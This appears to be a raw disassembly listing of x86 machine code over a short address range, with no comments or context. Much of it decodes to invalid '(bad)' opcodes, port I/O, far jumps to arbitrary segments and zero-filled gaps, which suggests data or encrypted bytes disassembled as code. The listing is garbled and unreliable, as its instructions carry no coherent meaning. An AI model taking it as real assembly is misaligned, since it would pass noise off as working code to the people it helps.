  41cc18:	jbe    0x41cbf6
  41cc1a:	stos   BYTE PTR es:[edi],al
  41cc1b:	or     bl,BYTE PTR [eax+0x1165c4f5]
  41cc21:	pop    ds
  41cc22:	(bad)  
  41cc23:	retw   
  41cc25:	push   eax
  41cc26:	pop    eax
  41cc27:	adc    eax,0xe83b5851
  41cc2c:	in     eax,0x5a
  41cc2e:	xchg   bl,al
  41cc30:	in     al,dx
  41cc31:	add    edi,esi
  41cc33:	int    0x9b
  41cc35:	jno    0x41cbed
  41cc37:	xor    dl,BYTE PTR [ebx+0x2ecaa403]
  41cc3d:	repnz (bad) [ecx+esi*2-0x25]
  41cc42:	cs js  0x41cc81
  41cc45:	dec    esp
  41cc46:	mov    ebx,0xc134757
  41cc4b:	adc    bl,dh
  41cc4d:	out    0x18,al
  41cc4f:	imul   edx,DWORD PTR [ecx+0x75],0xffffffd5
  41cc53:	mov    cl,0xde
  41cc55:	adc    ah,0x6a
  41cc58:	xchg   esi,eax
  41cc59:	dec    eax
  41cc5a:	lock (bad) [edx+edx*8]
  41cc5e:	sbb    al,bh
  41cc60:	or     cl,BYTE PTR [esi+0x7d]
  41cc63:	mov    al,0x50
  41cc65:	mov    bl,0x67
  41cc67:	test   BYTE PTR [ecx],dh
  41cc69:	or     BYTE PTR [edx+ebx*1+0x1c],0x1f
  41cc6e:	mov    dh,0xf3
  41cc70:	jns    0x41cc99
  41cc72:	popa   
  41cc73:	rcr    BYTE PTR [ecx],cl
  41cc75:	xchg   edi,eax
  41cc76:	ds out 0x1d,al
  41cc79:	(bad)  
  41cc7a:	mov    edx,0xce182c15
  41cc7f:	adc    bh,BYTE PTR [ebx+0x7f149ab]
  41cc85:	outs   dx,BYTE PTR ds:[esi]
  41cc86:	xchg   esi,eax
  41cc87:	add    al,0xb4
  41cc89:	sub    eax,0x26e2e1ad
  41cc8e:	out    0xf4,al
  41cc90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc91:	pop    ss
  41cc92:	xor    BYTE PTR [edx-0x41],ch
  41cc95:	cdq    
  41cc96:	clc    
  41cc97:	jo     0x41cc25
  41cc99:	xchg   ebx,eax
  41cc9a:	cmp    DWORD PTR [eax+0x35],esi
  41cc9d:	cmp    al,0x70
  41cc9f:	into   
  41cca0:	jmp    0x41cc7d
  41cca2:	mov    ch,0x1c
  41cca4:	mulps  xmm1,xmm3
  41cca7:	mov    esp,0xacf4dc9c
  41ccac:	test   dh,ah
  41ccae:	or     edi,DWORD PTR [esi+0x29fc60cc]
  41ccb4:	push   ss
  41ccb5:	pushf  
  41ccb6:	add    al,0x3e
  41ccb8:	xor    eax,0xbe701af9
  41ccbd:	shr    DWORD PTR ds:0xab6523dc,1
  41ccc3:	mov    ebx,0xfaa27736
  41ccc8:	call   0x98ba042
  41cccd:	retf   
  41ccce:	mov    dl,0xcd
  41ccd0:	adc    al,0x67
  41ccd2:	cld    
  41ccd3:	imul   edi,DWORD PTR [edi-0x42048f0b],0x74
  41ccda:	inc    BYTE PTR [ebx+esi*2+0x2b]
  41ccde:	in     eax,0xfd
  41cce0:	add    bh,BYTE PTR [ebp-0x14]
  41cce3:	pop    es
  41cce4:	or     DWORD PTR [eax+0x68],esp
  41cce7:	push   edi
  41cce8:	mov    fs,esi
  41ccea:	data16 and al,0x2e
  41cced:	xchg   BYTE PTR [edx+0x2f],dl
  41ccf0:	aam    0x94
  41ccf2:	cmp    al,0xa9
  41ccf4:	push   0x71
  41ccf6:	cdq    
  41ccf7:	add    DWORD PTR [edi+ebx*8+0x506bb0a],ecx
  41ccfe:	imul   ebx,eax,0x21
  41cd01:	jmp    0x41ccb0
  41cd03:	mov    DWORD PTR [ecx-0x4c],ebp
  41cd06:	push   ss
  41cd07:	stc    
  41cd08:	rep stos DWORD PTR es:[edi],eax
  41cd0a:	or     bl,BYTE PTR ds:0x889f154a
  41cd10:	push   eax
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	loop   0x41cddb
  41cd82:	mov    al,0x9d
  41cd84:	mov    bh,0x32
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    eax,0x16000001
  41cd8d:	inc    ebx
  41cd8e:	test   DWORD PTR [edi-0x9],edx
  41cd91:	ret    0x2c11
  41cd94:	retf   0xf8b2
  41cd97:	ficom  WORD PTR [esi-0xf]
  41cd9a:	or     ebp,DWORD PTR [edx-0x5f]
  41cd9d:	inc    ebx
  41cd9e:	sti    
  41cd9f:	pop    eax
  41cda0:	jno    0x41cdfe
  41cda2:	out    0xca,al
  41cda4:	inc    esi
  41cda5:	jecxz  0x41cdcc
  41cda7:	bound  esi,QWORD PTR [esi+eax*4]
  41cdaa:	add    BYTE PTR [eax],dh
  41cdac:	adc    al,0x90
  41cdae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdaf:	and    bl,bl
  41cdb1:	mov    ebp,0xa38967fe
  41cdb6:	sbb    DWORD PTR [edx-0x63ea84d3],ebx
  41cdbc:	xchg   edi,eax
  41cdbd:	mov    bh,0x9d
  41cdbf:	sub    ebp,0xffffff87
  41cdc2:	fprem  
  41cdc4:	mov    eax,ds:0x8157308
  41cdc9:	retf   
  41cdca:	jnp    0x41cd56
  41cdcc:	mov    dl,0x1c
  41cdce:	jecxz  0x41cd78
  41cdd0:	ins    DWORD PTR es:[edi],dx
  41cdd1:	mov    dl,0x33
  41cdd3:	ins    DWORD PTR es:[edi],dx
  41cdd4:	xor    ecx,DWORD PTR [esi+eiz*2+0x35]
  41cdd8:	xchg   BYTE PTR [edx+0x699986ca],dh
  41cdde:	cld    
  41cddf:	jb     0x41ce1f
  41cde1:	out    dx,eax
  41cde2:	lock popf 
  41cde4:	stc    
  41cde5:	dec    ebx
  41cde6:	jae    0x41ce36
  41cde8:	and    bh,BYTE PTR [ebx-0x1d]
  41cdeb:	in     al,0x85
  41cded:	and    cl,cl
  41cdef:	leave  
  41cdf0:	mov    ebx,0xf3689331
  41cdf5:	xor    eax,0x93a78c01
  41cdfa:	sbb    BYTE PTR ds:0xcf41797d,bh
  41ce00:	ins    DWORD PTR es:[edi],dx
  41ce01:	and    ah,bh
  41ce03:	ror    DWORD PTR [esi+0x42],cl
  41ce06:	mov    al,ds:0x4cd501a
  41ce0b:	mov    ch,0xd8
  41ce0d:	push   cs
  41ce0e:	ss ja  0x41ce7c
  41ce11:	xchg   esi,ebp
  41ce13:	add    edi,DWORD PTR [eax+0x42]
  41ce16:	push   ebp
  41ce17:	mov    al,ds:0x3e073994
  41ce1c:	popa   
  41ce1d:	xor    eax,0x5afafb85
  41ce22:	mov    al,ds:0x1ae70c14
  41ce27:	xor    al,0x7a
  41ce29:	outs   dx,DWORD PTR ds:[esi]
  41ce2a:	cwde   
  41ce2b:	and    eax,0x26331a79
  41ce30:	aas    
  41ce31:	retf   0xfc92
  41ce34:	pop    eax
  41ce35:	inc    BYTE PTR [edx]
  41ce37:	and    eax,0x631f27de
  41ce3c:	fsub   QWORD PTR [eax]
  41ce3e:	retf   
  41ce3f:	pop    ds
  41ce40:	shr    BYTE PTR [ebx+eax*4-0x73],0x2a
  41ce45:	cmp    ch,ah
  41ce47:	mov    esp,0x43e997ee
  41ce4c:	or     BYTE PTR [ebx-0x7c],dl
  41ce4f:	inc    esi
  41ce50:	outs   dx,DWORD PTR ds:[esi]
  41ce51:	mov    edx,DWORD PTR [ebx]
  41ce53:	inc    esi
  41ce54:	jo     0x41ce63
  41ce56:	ret    
  41ce57:	dec    edi
  41ce58:	loope  0x41ce9a
  41ce5a:	mov    esi,0x1ebdd48b
  41ce5f:	add    DWORD PTR [eax+0x6c],esi
  41ce62:	mov    bl,0xa5
  41ce64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce65:	mul    DWORD PTR [eax+0x50]
  41ce68:	xor    al,0x93
  41ce6a:	jae    0x41ce82
  41ce6c:	je     0x41cec7
  41ce6e:	scas   al,BYTE PTR es:[edi]
  41ce6f:	mov    bl,0x34
  41ce71:	or     eax,0xab4b289a
  41ce76:	call   0xecf7:0x9d122136
  41ce7d:	mov    edi,0xb7205d45
  41ce82:	or     eax,0x2f945684
  41ce87:	std    
  41ce88:	in     eax,0xb0
  41ce8a:	leave  
  41ce8b:	arpl   WORD PTR [edx-0x52],bp
  41ce8e:	xor    DWORD PTR [ecx-0xa],ebp
	...
  41cef1:	add    BYTE PTR [eax],al
  41cef3:	add    BYTE PTR [edi],al
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	push   eax
  41cf01:	mov    es,WORD PTR [edx-0x7b]
  41cf04:	mov    esp,0x5000133
  41cf09:	add    DWORD PTR [eax],eax
  41cf0b:	add    ah,bh
  41cf0d:	cmp    edx,DWORD PTR [esp+ecx*2-0x78bba9f7]
  41cf14:	or     al,BYTE PTR [esi]
  41cf16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf17:	lahf   
  41cf18:	sbb    eax,0x9dc5e6cf
  41cf1d:	inc    ebx
  41cf1e:	and    DWORD PTR [eax+eiz*4-0x2852cc71],0x52
  41cf26:	cmp    cl,BYTE PTR [eax]
  41cf28:	pop    ss
  41cf29:	dec    esp
  41cf2a:	xchg   ecx,eax
  41cf2b:	fbstp  TBYTE PTR [edi-0x38efb2e1]
  41cf31:	and    esp,eax
  41cf33:	cmp    al,0x69
  41cf35:	cmp    eax,0xff3e70f
  41cf3a:	out    0x61,al
  41cf3c:	fs cmp eax,0x157dd5c9
  41cf42:	jmp    0x41cfc2
  41cf44:	pop    esi
  41cf45:	xor    ch,BYTE PTR [ebx-0x2b1de7d5]
  41cf4b:	dec    edi
  41cf4c:	cmp    eax,0x645d70b0
  41cf51:	sub    eax,0x838cb400
  41cf56:	xchg   ecx,eax
  41cf57:	sub    eax,0x985b33b
  41cf5c:	inc    ebx
  41cf5d:	fisubr WORD PTR [edx+esi*1-0x6d966717]
  41cf64:	pop    edx
  41cf65:	int3   
  41cf66:	aam    0x26
  41cf68:	inc    ebp
  41cf69:	xor    ebx,eax
  41cf6b:	cmp    DWORD PTR [ebx],esp
  41cf6d:	push   cs
  41cf6e:	test   BYTE PTR ds:0x84515a51,ch
  41cf74:	std    
  41cf75:	sbb    al,0x35
  41cf77:	adc    al,0x75
  41cf79:	jp     0x41cf50
  41cf7b:	cmp    BYTE PTR [eax-0x46],ch
  41cf7e:	into   
  41cf7f:	retf   0x7b5e
  41cf82:	call   0xf687f2fd
  41cf87:	pop    ebp
  41cf89:	arpl   WORD PTR [eax+0x2e47bb39],ax
  41cf8f:	jnp    0x41cfa7
  41cf91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf92:	dec    edi
  41cf93:	sub    al,0x64
  41cf95:	es sub eax,0x494e0213
  41cf9b:	hlt    
  41cf9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf9d:	cdq    
  41cf9e:	ds mov ch,0x21
  41cfa1:	push   0xa
  41cfa3:	cdq    
  41cfa4:	mov    ch,0xf4
  41cfa6:	std    
  41cfa7:	mov    ss,WORD PTR [ebx-0x579eac10]
  41cfad:	inc    esi
  41cfae:	retf   0xfd12
  41cfb1:	iret   
  41cfb2:	jle    0x41cf8a
  41cfb4:	mul    BYTE PTR [eax-0x54b53065]
  41cfba:	loop   0x41cfab
  41cfbc:	aaa    
  41cfbd:	jnp    0x41cf6c
  41cfbf:	daa    
  41cfc0:	out    0xd4,al
  41cfc2:	xchg   ebp,eax
  41cfc3:	sbb    BYTE PTR [eax],al
  41cfc5:	sub    al,0x74
  41cfc7:	fdiv   DWORD PTR [ecx-0x47]
  41cfca:	sbb    edi,DWORD PTR [edx+0xd]
  41cfcd:	sbb    BYTE PTR [ebx+0x44],0x1e
  41cfd1:	sub    bh,ah
  41cfd3:	push   ebp
  41cfd4:	xchg   DWORD PTR [edi],eax
  41cfd6:	loop   0x41cfc0
  41cfd8:	mov    DWORD PTR [edi*8+0x71e6ba7d],ebx
  41cfdf:	xor    edi,DWORD PTR [esi-0x18]
  41cfe2:	shl    esp,1
  41cfe4:	sbb    al,0x8b
  41cfe6:	clc    
  41cfe7:	iret   
  41cfe8:	pop    ds
  41cfe9:	out    dx,eax
  41cfea:	sbb    al,0x9
  41cfec:	add    eax,0x284a4c8b
  41cff1:	std    
  41cff2:	fsub   st(1),st
  41cff4:	inc    ebx
  41cff5:	adc    ah,bh
  41cff7:	sbb    DWORD PTR [edi+0x4b],0x15b9d1c4
  41cffe:	pusha  
  41cfff:	and    esi,DWORD PTR [esi+0x9]
  41d002:	push   ebp
  41d003:	jge    0x41cfb8
  41d005:	imul   edx,DWORD PTR [eax-0x20f79322],0x4b
  41d00c:	shr    BYTE PTR [ebx+0xe319cf],0x0
	...
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x9d19eebd
  41d083:	sub    ecx,eax
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR ds:0x16000001,al
  41d08d:	test   al,0x8e
  41d08f:	lock sbb BYTE PTR [edx],dl
  41d092:	mov    ebx,0x24bc2275
  41d097:	mov    bh,0xac
  41d099:	ins    BYTE PTR es:[edi],dx
  41d09a:	push   edx
  41d09b:	jp     0x41d0ae
  41d09d:	push   eax
  41d09e:	bound  eax,QWORD PTR [esi+eax*4]
  41d0a1:	es cld 
  41d0a3:	lods   al,BYTE PTR ds:[esi]
  41d0a4:	add    al,0x6f
  41d0a6:	test   al,0x33
  41d0a8:	jl     0x41d069
  41d0aa:	push   edi
  41d0ab:	daa    
  41d0ac:	mov    dl,0x8a
  41d0ae:	push   0xffffffd0
  41d0b0:	out    0x45,al
  41d0b2:	mov    ch,0xe5
  41d0b4:	aaa    
  41d0b5:	shr    bh,1
  41d0b7:	clc    
  41d0b8:	ja     0x41d0cb
  41d0ba:	mov    eax,ds:0x8fcbea6b
  41d0bf:	stc    
  41d0c0:	dec    esp
  41d0c1:	mov    ch,0xc8
  41d0c3:	sbb    eax,0xbb688419
  41d0c8:	mov    ch,0x99
  41d0ca:	push   ebx
  41d0cb:	jmp    0x41d0fd
  41d0cd:	call   0xb34bfb90
  41d0d2:	or     BYTE PTR [edx],al
  41d0d4:	xor    BYTE PTR [esp+ebx*4],dl
  41d0d7:	jb     0x41d138
  41d0d9:	inc    ebx
  41d0da:	pushf  
  41d0db:	dec    esp
  41d0dc:	or     al,0x33
  41d0de:	ja     0x41d084
  41d0e0:	mov    edi,0xb95d2a80
  41d0e5:	aaa    
  41d0e6:	aad    0x7f
  41d0e8:	xchg   ebp,eax
  41d0e9:	shl    ah,0x9a
  41d0ec:	sbb    dh,ah
  41d0ee:	jge    0x41d138
  41d0f0:	retf   
  41d0f1:	popa   
  41d0f2:	sbb    eax,DWORD PTR [ecx]
  41d0f4:	adc    BYTE PTR [ecx+0x6],ah
  41d0f7:	fld    QWORD PTR [ecx-0x52e65c2e]
  41d0fd:	in     al,0xf4
  41d0ff:	ins    BYTE PTR es:[edi],dx
  41d100:	test   eax,0xf1be595c
  41d105:	and    cl,BYTE PTR [eax+0x2b6b4621]
  41d10b:	push   es
  41d10c:	sub    DWORD PTR [eax-0x28],ebp
  41d10f:	pop    esi
  41d110:	mov    dl,0x1a
  41d112:	lods   eax,DWORD PTR ss:[esi]
  41d114:	nop
  41d115:	push   edx
  41d116:	pop    edi
  41d117:	dec    ebp
  41d118:	dec    ecx
  41d119:	push   ecx
  41d11a:	inc    edi
  41d11b:	(bad)  
  41d11c:	leave  
  41d11d:	sub    dh,bl
  41d11f:	clc    
  41d120:	fidiv  DWORD PTR [esi+0x54d352e4]
  41d126:	or     BYTE PTR [esi-0x42630439],0x33
  41d12d:	std    
  41d12e:	fs pushf 
  41d130:	nop
  41d131:	ins    DWORD PTR es:[edi],dx
  41d132:	sub    eax,0xd660e5b3
  41d137:	sar    edi,0x8f
  41d13a:	(bad)  
  41d13c:	xchg   esi,eax
  41d13d:	cmp    eax,0xca6b5ca5
  41d142:	scas   ax,WORD PTR es:[edi]
  41d144:	xchg   edx,eax
  41d145:	xor    al,0xe2
  41d147:	mov    eax,ds:0xd141f1f0
  41d14c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d14d:	mov    dh,0xb8
  41d14f:	not    BYTE PTR [edx]
  41d151:	rol    BYTE PTR [esi-0x7a76c741],cl
  41d157:	stos   BYTE PTR es:[edi],al
  41d158:	mov    edx,0xdf3b7b7c
  41d15d:	jbe    0x41d18b
  41d15f:	inc    esp
  41d160:	cmp    al,0x5a
  41d162:	fs pop es
  41d164:	bnd call 0xf93d080f
  41d16a:	call   0xc58e:0xef6b8793
  41d171:	cmovle eax,DWORD PTR [edi]
  41d174:	dec    eax
  41d175:	dec    ecx
  41d176:	test   cl,al
  41d178:	enter  0x815d,0x7b
  41d17c:	loop   0x41d1af
  41d17e:	loop   0x41d183
  41d180:	mov    ebx,0xbc84c745
  41d185:	jmp    0x3ca72e88
  41d18a:	sub    ebp,edi
  41d18c:	das    
  41d18d:	jg     0x41d18d
  41d18f:	cwde   
  41d190:	mov    DWORD PTR [eax],0x0
	...
  41d1f2:	add    BYTE PTR [eax],al
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	mov    DWORD PTR [edi+0x35c6277e],edi
  41d206:	add    DWORD PTR [eax],eax
  41d208:	add    eax,0xef000001
  41d20d:	and    BYTE PTR [ebp-0x72077e17],dh
  41d213:	out    dx,al
  41d214:	cmc    
  41d215:	dec    ebp
  41d216:	dec    edi
  41d217:	sbb    eax,0xf52edbd9
  41d21c:	mov    ebx,0xefeab822
  41d221:	sbb    ah,BYTE PTR [eax-0x17]
  41d224:	pushf  
  41d225:	xchg   ecx,eax
  41d226:	(bad)  
  41d227:	ja     0x41d1bb
  41d229:	shl    DWORD PTR [edx+0x37347a2e],0x2b
  41d230:	cmp    al,BYTE PTR [esi+ebp*2+0x70575627]
  41d237:	mov    bh,0x72
  41d239:	mov    ch,0x41
  41d23b:	push   ds
  41d23c:	arpl   WORD PTR [ecx],si
  41d23e:	jo     0x41d27d
  41d240:	sub    BYTE PTR [eax+0x31],ah
  41d243:	into   
  41d244:	jl     0x41d2c2
  41d246:	fstp   QWORD PTR [ebp+0x60bf1063]
  41d24c:	stos   BYTE PTR es:[edi],al
  41d24d:	cmp    eax,edx
  41d24f:	in     al,dx
  41d250:	xchg   edi,eax
  41d251:	push   es
  41d252:	loope  0x41d298
  41d254:	push   esi
  41d255:	mov    edx,0x94a447df
  41d25a:	dec    ecx
  41d25b:	cwde   
  41d25c:	shr    DWORD PTR [eax+0x40a2b4a],0x1f
  41d263:	push   cs
  41d264:	cs aaa 
  41d266:	mov    ebx,0x894f43b1
  41d26b:	add    DWORD PTR [ebx+0x49],ecx
  41d26e:	mov    al,ds:0x3d80466d
  41d273:	iret   
  41d274:	jl     0x41d261
  41d276:	inc    eax
  41d277:	dec    ecx
  41d278:	addr16 mov dl,0x88
  41d27b:	inc    esi
  41d27c:	hlt    
  41d27d:	popa   
  41d27e:	adc    ecx,esi
  41d280:	jle    0x41d2cf
  41d282:	repz mov eax,ds:0x1a3d9661
  41d288:	xor    bl,BYTE PTR [ebx+0x35]
  41d28b:	sub    BYTE PTR [esi+0x7cf2811f],0xce
  41d292:	adc    al,0x78
  41d294:	xchg   esp,eax
  41d295:	stos   BYTE PTR es:[edi],al
  41d296:	push   edx
  41d297:	out    0xfc,eax
  41d299:	push   ds
  41d29a:	repnz cwde 
  41d29c:	hlt    
  41d29d:	sub    eax,DWORD PTR [edi]
  41d29f:	dec    ebp
  41d2a0:	mov    edx,0xe01aa95f
  41d2a5:	sub    al,0x1a
  41d2a7:	in     eax,dx
  41d2a8:	jmp    0x586:0x793ce512
  41d2af:	xor    dl,cl
  41d2b1:	das    
  41d2b2:	sub    BYTE PTR [edx-0x63d41f27],0xcf
  41d2b9:	xchg   BYTE PTR [ecx-0x6bfe44f4],ah
  41d2bf:	xor    al,0x3b
  41d2c1:	pop    ss
  41d2c2:	cld    
  41d2c3:	fstp   TBYTE PTR [ebp-0x1b]
  41d2c6:	jecxz  0x41d329
  41d2c8:	stc    
  41d2c9:	jmpw   0xcfa2
  41d2cd:	ja     0x6527c837
  41d2d3:	hlt    
  41d2d4:	dec    esi
  41d2d5:	jle    0x41d2fb
  41d2d7:	xor    ebp,DWORD PTR [ecx-0x32]
  41d2da:	mov    edi,0xb62d97a0
  41d2df:	addr16 jo 0x41d31a
  41d2e2:	das    
  41d2e3:	imul   bl
  41d2e5:	dec    ebp
  41d2e6:	daa    
  41d2e7:	sbb    al,0x8f
  41d2e9:	cmp    al,0xfd
  41d2eb:	js     0x41d279
  41d2ed:	aaa    
  41d2ee:	(bad)  
  41d2ef:	fs mov bl,0x3c
  41d2f2:	ds cmp eax,0x7c34d33f
  41d2f8:	gs adc eax,0x7df90f8e
  41d2fe:	jle    0x41d36d
  41d300:	adc    esi,DWORD PTR [edx+0x26]
  41d303:	and    DWORD PTR [eax+ebx*4-0x5a],0x26
  41d308:	push   es
  41d309:	packuswb mm3,QWORD PTR [eax+0x6f]
  41d30d:	jb     0x41d316
  41d30f:	out    0xd4,al
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx-0x15],0x2a
  41d382:	sbb    BYTE PTR [edi-0x35],cl
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0x44000001
  41d38d:	pop    esi
  41d38e:	fwait
  41d38f:	jle    0x41d3d2
  41d391:	fsub   QWORD PTR [eax]
  41d393:	in     eax,0x4b
  41d395:	sbb    bh,BYTE PTR [edi]
  41d397:	(bad)
  41d39a:	fsubr  QWORD PTR [edx-0x36902870]
  41d3a0:	scas   al,BYTE PTR es:[edi]
  41d3a1:	sbb    ah,bh
  41d3a3:	push   ds
  41d3a4:	pop    ss
  41d3a5:	inc    esi
  41d3a6:	fdivr  DWORD PTR [esi+0x62]
  41d3a9:	stos   DWORD PTR es:[edi],eax
  41d3aa:	in     eax,0x9
  41d3ac:	nop
  41d3ad:	mov    eax,ds:0xa7318512
  41d3b2:	gs ret 
  41d3b4:	pushf  
  41d3b5:	dec    eax
  41d3b6:	into   
  41d3b7:	in     eax,0x55
  41d3b9:	fmul   QWORD PTR [ebp+0xb7d3076]
  41d3bf:	inc    ebx
  41d3c0:	outs   dx,BYTE PTR ds:[esi]
  41d3c1:	xor    al,0x81
  41d3c3:	imul   esi,DWORD PTR [edx],0xffffff91
  41d3c6:	sbb    eax,0xd8fe84bd
  41d3cb:	add    dl,BYTE PTR [edi]
  41d3cd:	hlt    
  41d3ce:	adc    BYTE PTR [edx+0x16],ah
  41d3d1:	ficom  DWORD PTR [esi+0x17]
  41d3d4:	and    dl,ch
  41d3d6:	and    bl,BYTE PTR [edx]
  41d3d8:	pop    ds
  41d3d9:	stc    
  41d3da:	cs or  eax,0xb4a6d3da
  41d3e0:	outs   dx,DWORD PTR gs:[esi]
  41d3e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3e3:	mov    cl,0x24
  41d3e5:	jns    0x41d392
  41d3e7:	mov    dl,0x8c
  41d3e9:	push   es
  41d3ea:	jp     0x41d3ef
  41d3ec:	xchg   ecx,eax
  41d3ed:	rol    BYTE PTR [esi+ebx*4],cl
  41d3f0:	fs xor eax,0x3ea9581c
  41d3f6:	cmp    al,0x67
  41d3f8:	mov    DWORD PTR [edi+0x24428d43],ebp
  41d3fe:	loop   0x41d474
  41d400:	mov    esp,cs
  41d402:	rcr    ebp,0x83
  41d405:	call   0x130e:0x3b00baa6
  41d40c:	push   ds
  41d40d:	pop    es
  41d40e:	mov    al,ds:0x5997fac3
  41d413:	mov    ch,0xa4
  41d415:	lock push es
  41d417:	sub    al,0xed
  41d419:	mov    bl,BYTE PTR [eax-0x2a]
  41d41c:	push   0x8d82fd87
  41d421:	sbb    eax,DWORD PTR [eax-0x2e]
  41d424:	ss aas 
  41d426:	ja     0x41d3c9
  41d428:	cdq    
  41d429:	rcl    BYTE PTR es:[edx],1
  41d42c:	(bad)  
  41d42d:	jmp    0xdc1fb5dc
  41d432:	and    esp,DWORD PTR [eax-0x8214e74]
  41d438:	leave  
  41d439:	xchg   ebp,eax
  41d43a:	pop    edx
  41d43b:	mov    dh,0xb9
  41d43d:	and    eax,0x8b921c23
  41d442:	push   ds
  41d443:	mov    dl,0x24
  41d445:	inc    ebp
  41d446:	push   es
  41d447:	je     0x41d435
  41d449:	xchg   ebp,eax
  41d44a:	and    cl,dh
  41d44c:	arpl   WORD PTR [eax-0x4a9df2fd],bx
  41d452:	fst    DWORD PTR [edx+0x1dd3acf1]
  41d458:	dec    esi
  41d459:	lock xor eax,0x41c1601d
  41d45f:	je     0x41d471
  41d461:	cs push ss
  41d463:	mov    eax,ds:0xe2708d09
  41d468:	mov    ch,0x31
  41d46a:	out    0xa0,eax
  41d46c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d46d:	and    bl,BYTE PTR [ebp-0x17]
  41d470:	gs dec ecx
  41d472:	imul   esi,ebp,0xffffffd1
  41d475:	push   esi
  41d476:	jmp    0x7dd0:0x752d0db2
  41d47d:	dec    esp
  41d47e:	shr    BYTE PTR ds:0x8b3292ae,0x13
  41d485:	loope  0x41d41b
  41d487:	adc    DWORD PTR [esi+0x4d],ecx
  41d48a:	int    0xfa
  41d48c:	sbb    edx,DWORD PTR [ebp-0x1e]
  41d48f:	push   esi
  41d490:	jle    0x41d492
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd0d3:0xa49beb89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0x5000001
  41d50d:	pushf  
  41d50e:	xor    al,0xd3
  41d510:	fcmovnbe st,st(0)
  41d512:	aaa    
  41d513:	add    eax,0x747e801d
  41d518:	lds    ebx,FWORD PTR [edi-0x32]
  41d51b:	hlt    
  41d51c:	pop    es
  41d51d:	inc    edx
  41d51e:	les    esi,FWORD PTR [edi]
  41d520:	pop    ebx
  41d521:	push   es
  41d522:	out    dx,al
  41d523:	sahf   
  41d524:	cli    
  41d525:	shr    DWORD PTR [eax+0x339f0e01],0xcc
  41d52c:	mov    al,ch
  41d52e:	test   BYTE PTR ds:[esi-0x5e],0xb9
  41d533:	clc    
  41d534:	sub    edi,DWORD PTR [esi+0x33]
  41d537:	aas    
  41d538:	or     cl,bh
  41d53a:	je     0x41d5b2
  41d53c:	dec    esi
  41d53d:	push   ebp
  41d53e:	push   ss
  41d53f:	sbb    eax,0xfd7208d5
  41d544:	in     eax,0x5b
  41d546:	ficom  DWORD PTR [ebx]
  41d548:	inc    ebx
  41d549:	not    BYTE PTR [ebx]
  41d54b:	xchg   BYTE PTR [ecx+edx*2],al
  41d54e:	nop    DWORD PTR [ebx+0x4b98751d]
  41d555:	rcl    DWORD PTR [ecx+0x47],1
  41d558:	and    ebp,0x76d920d7
  41d55e:	imul   ebx,DWORD PTR gs:[eax-0x6217b1f0],0x61d3a4c8
  41d569:	xchg   al,cl
  41d56b:	mov    DWORD PTR [edi],esi
  41d56d:	dec    esp
  41d56e:	jl     0x41d528
  41d570:	sub    eax,0xf1212fee
  41d575:	xor    al,0xf9
  41d577:	inc    edi
  41d578:	in     eax,dx
  41d579:	les    edi,FWORD PTR [esi+0x48]
  41d57c:	stc    
  41d57d:	outs   dx,BYTE PTR ds:[esi]
  41d57e:	sbb    ecx,ebp
  41d580:	(bad)  
  41d581:	or     ebp,DWORD PTR [ebx+eax*8+0x72]
  41d585:	shl    BYTE PTR ds:0x369d9ff0,cl
  41d58b:	sbb    ebp,esp
  41d58d:	jmp    0x4560:0x9f7d24cc
  41d594:	dec    edi
  41d595:	or     al,0x3d
  41d597:	jmp    0x41d523
  41d599:	add    al,0x18
  41d59b:	test   DWORD PTR [ebp-0x75],esp
  41d59e:	add    ch,ah
  41d5a0:	mov    edi,0x5341736a
  41d5a5:	push   edi
  41d5a6:	mov    edi,0x2a012395
  41d5ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5ac:	aas    
  41d5ad:	sub    al,BYTE PTR [esp+ebx*4+0x318a7c3e]
  41d5b4:	test   eax,0xab6c6328
  41d5b9:	pop    ss
  41d5ba:	jp     0x41d615
  41d5bc:	mov    ebx,fs
  41d5be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5bf:	dec    ebp
  41d5c0:	mov    bl,0x2a
  41d5c2:	push   esi
  41d5c3:	pop    ss
  41d5c4:	imul   ecx,DWORD PTR [ebp-0x40ae5ba4],0xbaabc982
  41d5ce:	dec    ebp
  41d5cf:	adc    eax,0x7ed3d77c
  41d5d4:	jecxz  0x41d582
